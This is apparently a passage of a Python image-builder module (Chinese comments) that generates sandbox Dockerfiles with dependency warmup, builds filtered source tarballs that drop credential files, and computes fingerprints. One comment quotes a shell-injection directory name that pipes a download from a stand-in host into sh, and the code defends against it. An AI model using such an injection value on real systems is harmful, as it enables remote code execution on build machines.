            lines.append(
                f"RUN cd /workspace && ((test -x ./gradlew && ./gradlew --no-daemon classes "
                f"> {_log} 2>&1) || (gradle --no-daemon classes > {_log} 2>&1) "
                # ★复核 MED-4★ 机读标记 + 更长的日志尾：5 行装不下 gradle 的失败摘要
                # ★标记刻意不用 `SWARM_*=` 形态★ 那个命名空间被 `config/env_registry`
                # 当作【配置开关清册】管着（`test_f3_every_code_env_is_registered` 全仓扫
                # `SWARM_*` 并要求登记）——日志标记塞进去会被误当成未登记开关。共享命名
                # 空间但消费契约不同，改用 `[swarm:key=value]`（同样可 grep，不撞清册）。
                # （它的报错常带 `* What went wrong` / `* Try:` 好几段），而这是**唯一**能
                # 事后判断"~/.gradle 到底填没填上"的痕迹。
                f"|| echo '[swarm:gradle-warmup=failed] ⚠️ warmup gradle 联网编译失败（日志尾如下）') "
                f"; tail -40 {_log} 2>/dev/null || true")
            # 离线自检（软诊断，与 maven 侧对称：只报告，不阻断发布）
            # ★复核 H-5★ 收尾必须清 `build/`：`chmod -R 0777 /workspace` 发生在 warmup **之前**，
            # 留下的 build/ 与 .gradle/ 是 root 所有 + 默认权限，而 worker 可能以非 root 跑 gradle
            # ⇒ "could not create parent directories / Permission denied 编译失败"（本文件
            # :375 的注释就是在说这个）。maven 侧两条 RUN 都清了 target/，gradle 侧要对称。
            lines.append(
                "RUN cd /workspace && ((test -x ./gradlew && ./gradlew --offline --no-daemon classes -q) "
                "|| (gradle --offline --no-daemon classes -q)) "
                "&& echo '[swarm:gradle-offline=ok] ✅ warmup gradle 离线编译通过' "
                "|| echo '[swarm:gradle-offline=degraded] ⚠️ 离线编译仍有缺漏：运行时联网兜底' "
                "; find /workspace -type d -name build -prune -exec rm -rf {} + 2>/dev/null "
                "; rm -rf /workspace/.gradle 2>/dev/null || true")

        # ── Node warmup：对每个前端工程跑一次 npm 安装，把 node_modules 烤进镜像层 ──
        # 混合项目（前后端分离）主场：前端子任务的 `npm run build` 与 L1 的 TS/eslint repair
        # (`npx --no-install eslint`) 都依赖项目本地 node_modules。源码 tar 已排除 node_modules
        # (_SRC_EXCLUDE_DIRS)，故必须在镜像内 npm ci 装一遍（与 Maven 填 .m2 同理）。
        # 用 tc.dep_source（相对 package.json 路径）定位每个前端目录，支持多前端/monorepo。
        for tc in spec.toolchains:
            if tc.name != "node" or tc.build_tool != "npm":
                continue
            dep = (tc.dep_source or "package.json").replace("\\", "/").lstrip("/")
            sub = dep.rsplit("/", 1)[0] if "/" in dep else ""  # package.json 所在目录（"" = 项目根）
            # ★构建期 RCE 治本（26 号文 S-5）★：`dep_source` 来自【被扫描仓库的内容】
            # （rglob 出来的相对路径），仓库内容即攻击者可控。未转义直接拼进 `RUN` 时，
            # 形如 `ui; curl evil|sh; echo` 的目录名会以 root 在构建机 dockerd 内执行、
            # 带完整出网。同文件 :825/:892/:903 三处都已正确 shlex.quote，此处是唯一漏网。
            # 另加路径形态白名单：`..` 逃逸与绝对路径一律拒（既防 RCE 也防写到 /workspace 外）。
            if sub and not _SAFE_SUBDIR_RE.match(sub):
                logger.warning(
                    "跳过 npm warmup：dep_source 子目录名不安全（可能是注入载荷或路径逃逸）: %r", sub)
                continue
            wd = "/workspace" + (f"/{sub}" if sub else "")
            _wd_q = shlex.quote(wd)
            lines.append(f"# warmup：前端 {wd} 联网装依赖，固化 node_modules 进镜像层")
            # npm ci 要求 lock 文件齐全；缺 lock 退化 npm install；都失败不阻断（运行时联网兜底）
            # ★X-M4 同批（H-1 sibling）★ 原写法 `npm ci | tail -5 || npm install | tail -5 || echo`
            # 的 `||` 判的是 **tail** 的退出码（恒 0）⇒ npm install 兜底臂与 echo 臂全是
            # 死代码（gradle 段 H-1 已治过的同型，此处是漏网 sibling）。改日志文件形态：
            # 判成败只看命令本身退出码，tail 只负责打印。
            _npm_log = "/tmp/npm-warmup.log"
            lines.append(
                f"RUN cd {_wd_q} && (npm ci > {shlex.quote(_npm_log)} 2>&1 || "
                f"npm install > {shlex.quote(_npm_log)} 2>&1 || "
                f"echo 'npm 预装失败：运行时联网兜底') ; tail -5 {shlex.quote(_npm_log)} "
                f"2>/dev/null || true"
            )

        # ── go/rust/python warmup（X-M4，27 号文 §3.2）──
        # 治前 warmup 只覆盖 maven/gradle/npm：go 模块缓存 / cargo registry / python 依赖
        # 从不进镜像层 ⇒ 沙箱运行时首次构建全部现网拉（离线/弱网沙箱直接假失败——正是
        # gradle warmup 注释里"L1 构建闸在离线/弱网沙箱假失败"的同款）；rust 的
        # `cargo build --offline` 自测更是【恒 degraded】——缓存永远为空，"离线编译通过"
        # 对任何带依赖的 rust 工程都是死信（机制存在 ≠ 接得上：自测口径与 warmup 面错位）。
        # 与 npm 同形状：dep_source 定位清单目录逐个预热，失败不阻断（运行时联网兜底）
        # 但留机读 echo 标记（降级可观测，血规 3/10④）。
        # 命令模板走分派表（血规 1），加新栈只加表项。
        for tc in spec.toolchains:
            _wcmd = _simple_warmup_command(tc)
            if _wcmd is None:
                if (tc.name or "").lower() == "python":
                    # fail-honest：pyproject.toml/setup.py/Pipfile 无确定性预热形态
                    # （`pip install .` 依赖构建后端、可能执行任意 setup 代码）——
                    # 在生成物里留痕，而不是静默零预热（硬检查④）。
                    lines.append(
                        f"# X-M4：python 依赖清单为 {tc.dep_source or '?'}（非 requirements.txt）"
                        "——无确定性预热形态，依赖运行时解析（边界已登记）")
                continue
            dep = (tc.dep_source or "").replace("\\", "/").lstrip("/")
            sub = dep.rsplit("/", 1)[0] if "/" in dep else ""
            # S-5 同源判据：dep_source 来自被扫描仓库内容（攻击者可控），与 npm 段同闸
            if sub and not _SAFE_SUBDIR_RE.match(sub):
                logger.warning(
                    "跳过 %s warmup：dep_source 子目录名不安全（可能是注入载荷或路径逃逸）: %r",
                    tc.name, sub)
                continue
            wd = "/workspace" + (f"/{sub}" if sub else "")
            lines.append(f"# warmup（X-M4）：{tc.name} 依赖进镜像层（{wd}）")
            # H-1 同纪律：判成败绝不接管道（`cmd | tail` 的退出码是 tail 的 ⇒ 失败臂成
            # 死代码）。输出落日志文件、tail 只负责打印；模板内部可能自带 `||`（python
            # 的 PEP668 双臂），故 `{}` 成组后整体判一次退出码。
            _log = f"/tmp/xm4-warmup-{tc.name}.log"
            lines.append(
                f"RUN cd {shlex.quote(wd)} && ({{ {_wcmd}; }} > {shlex.quote(_log)} 2>&1 || "
                f"echo '[swarm:warmup=failed] ⚠️ {tc.name} 预热失败：运行时联网兜底'"
                f") ; tail -5 {shlex.quote(_log)} 2>/dev/null || true"
            )

    lines.append("# envd 由 base entrypoint 拉起；无前台 CMD。")
    return "\n".join(lines) + "\n"


# ──────────────────────────────────────────────
# 源码打包（方案 B：项目源码进镜像，通用排除构建产物）
# ──────────────────────────────────────────────
# 通用排除规则（与 preprocess EXCLUDED_DIRS 对齐核心项），不针对任何项目。
_SRC_EXCLUDE_DIRS = {
    ".git", "node_modules", "target", "build", "dist", ".gradle", ".mvn",
    "__pycache__", ".venv", "venv", ".idea", ".vscode", ".next", ".nuxt",
    "bin", "obj", ".tox", ".mypy_cache", ".pytest_cache", ".ruff_cache",
    ".codegraph",  # swarm 预处理产物
}
_SRC_EXCLUDE_EXTS = {
    ".pyc", ".pyo", ".so", ".dylib", ".dll", ".exe", ".o", ".a", ".lib",
    ".class", ".jar", ".war",  # java 构建产物
    ".zip", ".tar", ".gz", ".bz2", ".xz", ".7z",
    ".mp3", ".mp4", ".wav", ".avi", ".mov",
}

# ★X-C2 复核 C-2（实测）★ `.jar` 的排除会连**构建工具自己的 wrapper jar** 一起剥掉：
#     gradle/wrapper/gradle-wrapper.jar   ← ./gradlew 的全部实现就在这个 jar 里
#     .mvn/wrapper/maven-wrapper.jar      ← ./mvnw 同理（X-C1 同族，此前潜伏）
# 后果：镜像里 `gradlew` 脚本在、jar 不在 ⇒ `./gradlew` 报
# `找不到或无法载入主要类别 org.gradle.wrapper.GradleWrapperMain` ⇒ 而 L1 的
# `_derive_full_build_command` 见到 `gradlew` 就发 `./gradlew -q classes`、**没有 `|| gradle`
# 兜底** ⇒ 每轮硬失败 → BLOCKED → 重试 → 同样失败。127 换成 ClassNotFound，死循环不变。
# 这也证伪了"wrapper 优先＝工程钉的版本才是权威"这个前提——在这个镜像里 wrapper 根本跑不了。
# 故：wrapper 目录下的 jar 必须留。它们是**构建工具本体**，不是构建产物（几十 KB，不影响体积）。
#
# ★复核 HIGH-1（实测）★ 只留 jar **不够**：`./mvnw` 启动时要读
# `.mvn/wrapper/maven-wrapper.properties` 取 `distributionUrl`，而 `.mvn` 整目录被
# `_SRC_EXCLUDE_DIRS` 排除 ⇒ jar 留下了、properties 还是没了 ⇒ mvnw 照旧起不来。
# `.mvn/maven.config`（如 `-T 1C`）与 `.mvn/jvm.config`（如 `-Xmx`）同理：它们是**工程钉的
# 构建参数**，丢了会让镜像里的构建行为与工程作者的意图不一致（内存不够直接 OOM）。
# 判据统一成"wrapper/构建器配置白名单"，不再只盯 jar。
_SRC_KEEP_PATH_SUFFIXES = (
    # gradle wrapper：脚本 + jar + 版本声明
    "gradle/wrapper/gradle-wrapper.jar",
    "gradle/wrapper/gradle-wrapper.properties",
    # maven wrapper：jar + distributionUrl 声明
    ".mvn/wrapper/maven-wrapper.jar",
    ".mvn/wrapper/maven-wrapper.properties",
    # maven 工程钉的构建参数（丢了会让镜像里的构建与工程意图不一致）
    ".mvn/maven.config",
    ".mvn/jvm.config",
    ".mvn/extensions.xml",
)
# 旧名保留一轮（外部若有引用不至于当场断），指向同一份清单。
_SRC_KEEP_JAR_SUFFIXES = _SRC_KEEP_PATH_SUFFIXES


def _is_wrapper_jar(rel_path: str) -> bool:
    """该路径是否是构建工具本体/构建器配置（必须保留，见 `_SRC_KEEP_PATH_SUFFIXES`）。

    ★只剥**前导 `./`**，绝不用 `lstrip("./")`★ 后者会剥掉任意 `.`/`/` 组合，把
    `.mvn/wrapper/maven-wrapper.jar` 变成 `mvn/wrapper/...` ⇒ 匹配不上 ⇒ mvnw 的 jar 照旧被剥。
    本仓已被这个惯用法坑过两次（`.mvn/wrapper`、`.yarn/releases` 被当噪声剔没；本会话
    `l1_error_drivers._norm_rel` 同型）——它是**同一个**惯用法陷阱，不是巧合。
    """
    p = str(rel_path or "").replace("\\", "/")
    while p.startswith("./"):
        p = p[2:]
    p = p.lstrip("/")
    return any(p == s or p.endswith("/" + s) for s in _SRC_KEEP_PATH_SUFFIXES)
# W-3（21 号文）：tarball 单文件尺寸阈值显式常量。>阈值的合法产物（SQL 种子/
# 生成代码/bundle 源）会被 skip——必须 WARNING 可观测，否则镜像缺文件→沙箱假编译错
# 无迹可查。
_TARBALL_MAX_FILE_BYTES = 5 * 1024 * 1024


def _make_source_tarball(project_root: str | Path) -> bytes:
    """把项目源码打成 tar.gz（排除构建产物/二进制），返回字节。

    通用规则，适用任何项目。在内存里打包，由 SSH 上传到沙箱机解包进 build context。

    基线一致性（方案 B 关键）：若项目是 git 仓库，导出 **git HEAD 版**源码，使镜像内
    /workspace 的基线与 worker 运行时上传 writable 文件的基线（批次2-A 用 git HEAD）一致，
    避免"工作区未提交改动进了镜像、但 worker 覆盖的是 HEAD 版"导致镜像内文件不一致。
    非 git 仓库回退工作区当前内容。
    """
    # 两路（git archive 主路径 / 工作区扫描回退）共用同一本剔除账
    _skipped_sensitive: list[tuple[str, str]] = []
    import io
    import subprocess
    import tarfile

    project_root = Path(project_root)

    # git 仓库：用 git archive HEAD 导出（基线 = HEAD，与 worker 上传一致）
    if (project_root / ".git").exists():
        try:
            r = subprocess.run(
                ["git", "archive", "--format=tar", "HEAD"],
                cwd=str(project_root), capture_output=True, timeout=120,
            )
            if r.returncode == 0 and r.stdout:
                # git archive 出的 tar 已含 .gitattributes export-ignore 处理；
                # 再按通用排除规则过滤构建产物/二进制，重新打 gz。
                src_buf = io.BytesIO(r.stdout)
                out_buf = io.BytesIO()
                with tarfile.open(fileobj=src_buf, mode="r:") as src_tar, \
                     tarfile.open(fileobj=out_buf, mode="w:gz") as out_tar:
                    _skipped_big = 0
                    _skipped_link = 0
                    for member in src_tar.getmembers():
                        if not member.isfile():
                            # W-3：symlink/submodule gitlink 不随 tarball 进镜像（git
                            # archive 对 submodule 只出占位）——计数落账，不静默。
                            if member.issym() or member.islnk():
                                _skipped_link += 1
                            continue
                        parts = member.name.split("/")
                        if (any(p in _SRC_EXCLUDE_DIRS for p in parts)
                                and not _is_wrapper_jar(member.name)):
                            continue   # C-2：`.mvn` 整目录被排除，但 wrapper jar 必须留
                        if (Path(member.name).suffix.lower() in _SRC_EXCLUDE_EXTS
                                and not _is_wrapper_jar(member.name)):
                            continue   # C-2：wrapper jar 是构建工具本体，必须留
                        # ★敏感剔除必须在【这条主路径】上（复核 CRITICAL/HIGH-1）★
                        # 初版只加在下方的工作区扫描【回退】分支，而任何 git 仓库都走这里
                        # 并提前 return——E2E 基线 RuoYi、worker clone 出的客户仓库全是 git
                        # 仓库。只要凭据文件被 commit 过（这正是密钥闸存在的前提），就原样
                        # 进 tarball → COPY → chmod 0777 → push 到无认证 registry → 固化为
                        # 可复用模板。而当时的新测试用 pytest tmp_path（非 git 仓库）必然走
                        # 回退分支 → 恒绿，给出了与实际防护面【相反】的保证。
                        _sens_m = _sensitive_reject_reason(member.name)
                        if _sens_m:
                            _skipped_sensitive.append((member.name, _sens_m))
                            continue
                        if member.size > _TARBALL_MAX_FILE_BYTES:
                            _skipped_big += 1
                            logger.warning(
                                "源码 tarball 跳过超限文件（镜像将缺此文件，沙箱编译错先查此账）"
                                ": %s size=%d > %d",
                                member.name, member.size, _TARBALL_MAX_FILE_BYTES,
                            )
                            continue
                        f = src_tar.extractfile(member)
                        if f is not None:
                            out_tar.addfile(member, f)
                    if _skipped_link:
                        logger.warning(
                            "源码 tarball 跳过 %d 个 symlink/硬链接（镜像内将为缺文件状态）",
                            _skipped_link,
                        )
                _report_skipped_sensitive(_skipped_sensitive)
                return out_buf.getvalue()
        except Exception as _ga_exc:  # noqa: BLE001 — git archive 失败回退工作区扫描
            # 26 号文 J-H：原先 `except: pass` 零日志，既打破 docstring 承诺的
            # "镜像基线=git HEAD"不变量，又让 _dependency_fingerprint 读 HEAD、tarball 读
            # 工作区（B3 要根治的错位从后门放回）。回退是合理的，但必须留痕。
            logger.warning(
                "源码 tarball：git archive 失败，回退【工作区扫描】——镜像基线不再等于 "
                "git HEAD（未提交改动会一并入镜像）: %s", _ga_exc)

    # 非 git 仓库 / git archive 失败 → 扫工作区当前内容
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tar:
        for path in project_root.rglob("*"):
            try:
                rel_parts = path.relative_to(project_root).parts
            except ValueError:
                continue
            if (any(p in _SRC_EXCLUDE_DIRS for p in rel_parts)
                    and not _is_wrapper_jar("/".join(rel_parts))):
                continue   # C-2：`.mvn` 整目录被排除，但 wrapper jar 必须留
            if not path.is_file():
                continue
            if (path.suffix.lower() in _SRC_EXCLUDE_EXTS
                    and not _is_wrapper_jar("/".join(rel_parts))):
                continue   # C-2：wrapper jar 是构建工具本体，必须留
            # ★敏感文件绝不进镜像（26 号文 S-4）★：_SRC_EXCLUDE_* 是纯构建产物清单、
            # 无任何安全语义，实测 tarball 曾含 .env / .git-credentials / .npmrc /
            # deploy.pem / id_rsa。而链路是 COPY → chmod -R 0777 → docker push 到
            # localhost:5000（registry:2 默认无 TLS 无认证）→ **固化为可复用模板**，
            # 属不可撤销损失。判据复用 knowledge/ingest_guard（已过双复核、含源码扩展名
            # 排除，绝不误杀 env.py/Credentials.java 这类一等源码），不另造第二套口径。
            _rel_posix = "/".join(path.relative_to(project_root).parts)
            _sens = _sensitive_reject_reason(_rel_posix)
            if _sens:
                _skipped_sensitive.append((_rel_posix, _sens))
                continue
            # 跳过超大文件（>5MB，源码不应有，多半是误置的二进制/数据）
            try:
                if path.stat().st_size > _TARBALL_MAX_FILE_BYTES:
                    # W-3：合法大产物（SQL 种子/生成代码）被 skip 必须可观测
                    logger.warning(
                        "源码 tarball 跳过超限文件（镜像将缺此文件）: %s > %d bytes",
                        path, _TARBALL_MAX_FILE_BYTES,
                    )
                    continue
            except OSError:
                continue
            arcname = "/".join(path.relative_to(project_root).parts)
            tar.add(str(path), arcname=arcname)
    _report_skipped_sensitive(_skipped_sensitive)
    return buf.getvalue()


def _report_skipped_sensitive(skipped: list[tuple[str, str]]) -> None:
    """always-emit 剔除账（两路共用）。安全剔除与"隐藏路径降噪"分两条措辞——
    复核 LOW-3：把 .github/workflows/ci.yml 报成"敏感文件"会让排查者想不到构建缺文件。"""
    if not skipped:
        return
    _sec = [p for p, r in skipped if r == "sensitive_filename"]
    _hid = [p for p, r in skipped if r != "sensitive_filename"]
    if _sec:
        logger.warning("源码 tarball 剔除 %d 个【凭据类】文件（绝不入镜像）: %s",
                       len(_sec), _sec[:8])
    if _hid:
        logger.warning("源码 tarball 剔除 %d 个【隐藏路径】文件（镜像将缺它们，"
                       "沙箱构建报缺文件先查此账）: %s", len(_hid), _hid[:8])


def _sensitive_reject_reason(rel_path: str) -> str | None:
    """敏感文件判据——复用 knowledge/ingest_guard 的单一事实源（S-4 治本）。

    该判据已过 W1 双复核：含源码扩展名排除（`env.py`/`Credentials.java`/`secrets.py`
    这类一等源码不会被误杀）、隐藏路径、以及 kubeconfig/tfvars/tfstate 等业界头号泄露源。
    判据不可用时 **fail-closed 拒绝该文件**——凭据进镜像不可撤销，宁可少打一个文件。
    """
    try:
        # ★用 credential_reject_reason 而非 reject_reason_by_name（复核 MEDIUM）★
        # 后者会拒【隐藏目录】——那是知识库的降噪语义。实测它会剔掉
        # `.mvn/wrapper/maven-wrapper.properties` 与 `.yarn/releases/*`，
        # 用 mvnw / yarn Berry 的项目在沙箱里直接构建失败（且违反多栈中立）。
        from swarm.knowledge.ingest_guard import credential_reject_reason
        return credential_reject_reason(rel_path)
    except Exception as exc:  # noqa: BLE001
        # 降级必须可观测：判据不可用会把【整棵源码树】剔空（每个文件都命中本分支），
        # 沙箱里表现为"项目是空的"，只看日志会淹没在逐文件 warning 里。
        try:
            from swarm.infra.degrade import record_degrade
            record_degrade("worker.image_builder.sensitive_guard_unavailable")
        except Exception:  # noqa: BLE001 — 观测绝不阻断
            pass
        logger.warning("敏感文件判据不可用 → fail-closed 剔除 %s: %s", rel_path, exc)
        return "guard_unavailable"


def _selftest_command(spec: EnvSpec) -> str | None:
    """按 EnvSpec 工具链推导【构建期离线编译自测】命令（通用，不写死项目模块名）。

    在镜像内的 /workspace（已 COPY 项目源码）执行，证明完整项目能离线编译。
    返回 None 表示该工具链暂无自测（不阻断发布）。

    ★X-M5（27 号文 §3.2）★ 混编工程必须**逐栈**自测——治前首个命中即 return，
    java+npm 工程只自测 maven，npm 侧坏掉（如 node 装错版本）要等到运行时才炸。
    多栈用 ` && ` 链：任一栈自测失败整条失败（自测是软诊断不阻断发布，语义不变；
    是哪一段炸的见 /tmp/st.log）。同一条自测去重（java 的 build_tool 未定会与
    显式 maven 撞同一条）。
    """
    # ★复核 H-4★ 自测命令与安装片段**同读 `_STACK_REGISTRY`**。原先两处各手写一张分派表，
    # 于是"自测发 gradle 命令、安装只装 maven"这种分叉能长期存在（正是 X-C2 本体）。
    # 现在加新栈/新 build_tool 只能改 registry 一处，物理上不可能只落一半。
    cmds: list[str] = []
    for tc in spec.toolchains:
        entry = stack_entry(tc.name, tc.build_tool)
        if entry is None and (tc.name or "").lower() == "java" and not tc.build_tool:
            # build_tool 未定的 java（安装片段已保守装 maven+gradle）→ 用 maven 自测兜底：
            # 有 pom 就真编译；无 pom 时命令自身失败，属软诊断不阻断（复核 L-2）。
            entry = stack_entry("java", "maven")
        if entry is not None and entry.selftest and entry.selftest not in cmds:
            cmds.append(entry.selftest)
    return " && ".join(cmds) if cmds else None


# ──────────────────────────────────────────────
# warmup pom 生成（Maven 多模块：聚合外部依赖，排内部模块）
# ──────────────────────────────────────────────
# 专属镜像 warmup（对真项目 mvn compile）用的 settings：
#   ① aliyun 镜像加速 central（快）
#   ② maven-central-direct 直连仓库兜底——aliyun 公共仓缺失的第三方包（如
#      com.warrenstrange:googleauth）由此拉取。治本关键：mirrorOf=central 只代理
#      ID 为 "central" 的仓库，maven-central-direct 用不同 ID 不被 aliyun 拦截，
#      使 warmup `mvn compile` 能拉满【真实项目】的完整依赖闭包（含 aliyun 缺的包），
#      不再因 aliyun 404 + `|| true` 静默漏依赖、运行时 build fail。
_MAVEN_SETTINGS = """<?xml version="1.0" encoding="UTF-8"?>
<settings>
  <mirrors>
    <mirror>
      <id>aliyun</id><name>Aliyun</name>
      <url>https://maven.aliyun.com/repository/public</url>
      <mirrorOf>central</mirrorOf>
    </mirror>
  </mirrors>
  <profiles>
    <profile>
      <id>maven-central-fallback</id>
      <activation><activeByDefault>true</activeByDefault></activation>
      <repositories>
        <repository>
          <id>maven-central-direct</id>
          <name>Maven Central Direct</name>
          <url>https://repo1.maven.org/maven2</url>
          <releases><enabled>true</enabled><updatePolicy>never</updatePolicy></releases>
          <snapshots><enabled>false</enabled></snapshots>
        </repository>
      </repositories>
    </profile>
  </profiles>
</settings>
"""


def generate_maven_warmup_pom(project_root: Path, root_pom_rel: str) -> str:
    """读项目多模块 pom → 生成 warmup 聚合 pom（外部依赖，排 内部模块 groupId）。

    复用 A 部分验证过的策略（docs §卡点③）：继承根 pom 属性 + 外部依赖，排除项目自身
    groupId 的内部模块（运行时现编现连）。
    """
    import xml.etree.ElementTree as ET

    def _t(tag: str) -> str:
        return tag.split("}", 1)[-1] if "}" in tag else tag

    root_pom = project_root / root_pom_rel
    tree = ET.parse(root_pom)
    rootel = tree.getroot()

    # 项目自身 groupId（内部模块要排除）
    internal_gid = None
    props: dict[str, str] = {}
    dep_mgmt: list[tuple[str, str, str]] = []
    deps: list[tuple[str, str, str]] = []
    for child in rootel:
        tag = _t(child.tag)
        if tag == "groupId" and child.text:
            internal_gid = child.text.strip()
        elif tag == "properties":
            for p in child:
                if p.text:
                    props[_t(p.tag)] = p.text.strip()
        elif tag == "dependencyManagement":
            for d in child.iter():
                if _t(d.tag) == "dependency":
                    g = d.find("./{*}groupId"); a = d.find("./{*}artifactId"); v = d.find("./{*}version")
                    if g is not None and a is not None:
                        dep_mgmt.append((g.text or "", a.text or "", (v.text or "") if v is not None else ""))
        elif tag == "dependencies":
            for d in child:
                if _t(d.tag) == "dependency":
                    g = d.find("./{*}groupId"); a = d.find("./{*}artifactId"); v = d.find("./{*}version")
                    deps.append((g.text or "" if g is not None else "",
                                 a.text or "" if a is not None else "",
                                 v.text or "" if v is not None else ""))

    def _is_internal(gid: str) -> bool:
        return bool(internal_gid) and gid == internal_gid

    prop_xml = "\n".join(f"        <{k}>{v}</{k}>" for k, v in props.items())
    # dependencyManagement（保留 BOM import，排内部）
    dm_xml = ""
    for g, a, v in dep_mgmt:
        if _is_internal(g):
            continue
        ver = f"<version>{v}</version>" if v else ""
        scope_type = "<type>pom</type><scope>import</scope>" if "dependencies" in a or "bom" in a.lower() else ""
        dm_xml += f"            <dependency><groupId>{g}</groupId><artifactId>{a}</artifactId>{ver}{scope_type}</dependency>\n"
    # 外部 dependencies（排内部模块）
    dep_xml = ""
    for g, a, v in deps:
        if _is_internal(g):
            continue
        ver = f"<version>{v}</version>" if v else ""
        dep_xml += f"        <dependency><groupId>{g}</groupId><artifactId>{a}</artifactId>{ver}</dependency>\n"

    return f"""<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.swarm.warmup</groupId>
    <artifactId>proj-dep-warmup</artifactId>
    <version>1.0.0</version>
    <packaging>jar</packaging>
    <properties>
        <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
{prop_xml}
    </properties>
    <dependencyManagement>
        <dependencies>
{dm_xml}        </dependencies>
    </dependencyManagement>
    <dependencies>
{dep_xml}    </dependencies>
</project>
"""


# ──────────────────────────────────────────────
# 构建主流程
# ──────────────────────────────────────────────
@dataclass
class BuildResult:
    ok: bool
    template_id: str | None = None
    image_tag: str | None = None
    message: str = ""


# 构建器逻辑版本：Dockerfile 生成逻辑/warmup/权限处理等变更时递增，
# 使旧模板指纹失效触发重建（仅 deps+src 指纹无法感知构建逻辑变化）。
_BUILDER_VERSION = "11"  # v11: X-M4——warmup 从「仅 maven/gradle/npm」扩到 go/rust/python（go mod download / cargo fetch / pip install -r）+ python 安装段配 aliyun 镜像 ⇒ 生成 Dockerfile 变了必须递增，否则复用老镜像=预热修复不落地（X-C2/P-C3/X-M5 同形状第四次；摘要守卫同批把 generate_dockerfile 全输出纳入）
#                       v10: X-M5——混编工程 `_selftest_command` 从「首个命中即 return」改为逐栈自测（` && ` 链+去重）⇒ 多工具链镜像的构建期自测脚本变了必须递增，否则复用老镜像=混编自测修复不落地（X-C2/P-C3 同形状；摘要守卫同批把组合逻辑纳入）
#                       v9: 27 号文 #8——在场硬闸从「只有 gradle 有的一行字面量」推广到全部 6 个 (name,build_tool)（apt_packages 子串断言实测 2 条必然假过：go 只命中 ENV PATH、gradle 5/6 行是顺带命中）；Dockerfile 每个栈多一条 `RUN <verify>` ⇒ 生成物变了必须递增，否则复用老镜像=修复不落地
# v8: X-C2——java 按 build_tool 装(Gradle 工程原先镜像里没 gradle→127 死循环)+钉 gradle 发行版+init.gradle 镜像源+gradle warmup；wrapper jar 不再被 tarball 剥掉(./gradlew/./mvnw 原必 ClassNotFound)；强制重建所有专属镜像
#                       v7: _MAVEN_SETTINGS 加 Maven Central 直连兜底——治本 aliyun 缺失第三方包(googleauth)致 warmup 静默漏依赖、运行时 build fail；强制重建所有专属镜像
#                       v6: 烤确定性 repair 工具——Go goimports(GOBIN=/usr/local/bin) + 前端 npm 预装；强制重建所有专属镜像
#                              （CubeEgress MITM 出网信任）+ --allow-internet-access。0.3.x 旧模板
#                              snapshot 与 0.4.0 guest-image 不匹配(image version not eq)起不来，
#                              bump 版本使 fingerprint 变化 → 旧模板自动失效、按 0.4.0 重建。
#                       v4: warmup 去掉重量级 dependency:go-offline,直接 mvn -T 1C compile(快得多)


# 依赖/构建相关文件名（模板装的是工具链+依赖，只有这些变了才需重建镜像；
# 业务源码变了不影响工具链，worker bootstrap 会上传最新文件覆盖，不必重打模板）。
_DEP_BUILD_FILES = {
    "pom.xml", "build.gradle", "build.gradle.kts", "settings.gradle", "gradle.properties",
    "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml",
    "requirements.txt", "pyproject.toml", "poetry.lock", "Pipfile", "Pipfile.lock", "setup.py",
    "go.mod", "go.sum", "Cargo.toml", "Cargo.lock", "composer.json", "composer.lock",
    "Gemfile", "Gemfile.lock", "Dockerfile", ".tool-versions",
}


def _dependency_fingerprint(project_root: str | Path) -> str:
    """只 hash【依赖/构建相关文件】内容，业务源码变化不影响（task 第二批-3）。

    模板（沙箱镜像）的价值是工具链+依赖缓存，不是业务代码快照。新增/修改业务文件
    （如新建一个 Controller）不改变依赖 → 不该触发模板重建（重打镜像很贵）。
    只有 pom.xml/package.json/requirements.txt 等依赖文件变了，才需要重建。
    镜像内 /workspace 基线即使业务源码陈旧也无妨——worker bootstrap 会上传最新文件覆盖。
    """
    import hashlib
    import os
    project_root = Path(project_root)
    h = hashlib.sha256()
    found: list[str] = []
    try:
        for root, dirs, files in os.walk(project_root):
            dirs[:] = [d for d in dirs if d not in _SRC_EXCLUDE_DIRS]
            for fn in sorted(files):
                if fn in _DEP_BUILD_FILES:
                    rel = os.path.relpath(os.path.join(root, fn), project_root)
                    found.append(rel)
        # B3（worker 审计）：指纹与 tarball【同源】——tarball 取 `git archive HEAD`，指纹若
        # hash 工作区现值，一次「本地≠HEAD」错位（预处理恰逢未提交 dep 残留）后指纹恒匹配
        # → 镜像永不重建的静默闩锁。git 仓库时读 `HEAD:<rel>` blob（HEAD 无该文件=tarball
        # 也没有 → 跳过，同源）；非 git/HEAD 不可得回退磁盘现值（行为不劣化）。
        import subprocess as _sp
        _use_git = False
        try:
            _use_git = _sp.run(
                ["git", "-C", str(project_root), "rev-parse", "--verify", "HEAD"],
                capture_output=True, timeout=15,
            ).returncode == 0
        except Exception:  # noqa: BLE001
            _use_git = False
        for rel in sorted(found):
            data: bytes | None = None
            rel_posix = rel.replace(os.sep, "/")
            if _use_git:
                try:
                    _p = _sp.run(
                        ["git", "-C", str(project_root), "show", f"HEAD:{rel_posix}"],
                        capture_output=True, timeout=15,
                    )
                except Exception:  # noqa: BLE001
                    _p = None
                if _p is not None and _p.returncode == 0:
                    data = _p.stdout
                else:
                    continue  # HEAD 没有该文件 = tarball 也没有 → 不进指纹（同源）
            if data is None:
                try:
                    with open(project_root / rel, "rb") as f:
                        data = f.read()
                except OSError:
                    continue
            h.update(rel.encode())
            h.update(data)
    except Exception as _fp_exc:  # noqa: BLE001
        # B12⑦（19号文）：裸 except 静默返回"空指纹"（h 无输入 → 恒定 hexdigest）=
        # 不同项目/不同依赖状态同指纹 → 潜在误复用陈旧模板。fail-honest：异常返回
        # 随机指纹（永不匹配 → 强制重建，方向安全）+ WARNING 可观测。
        import uuid as _uuid
        logger.warning(
            "_dependency_fingerprint(%s) 扫描异常，返回随机指纹强制重建（不误复用陈旧模板）: %r",
            project_root, _fp_exc,
        )
        return f"err-{_uuid.uuid4().hex[:12]}"
    return h.hexdigest()[:12]


def compute_project_fingerprint(spec: EnvSpec, project_root: str | Path) -> str:
    """项目沙箱指纹 = builder版本 + deps_hash + 依赖/构建文件 hash。

    第二批-3 精调：原 src_hash 是【整个源码树】hash，任何业务文件变都触发模板重建（很贵）。
    改为只 hash 依赖/构建文件（pom.xml/package.json/...）——业务源码变不重打模板，只 deps 变才重打。
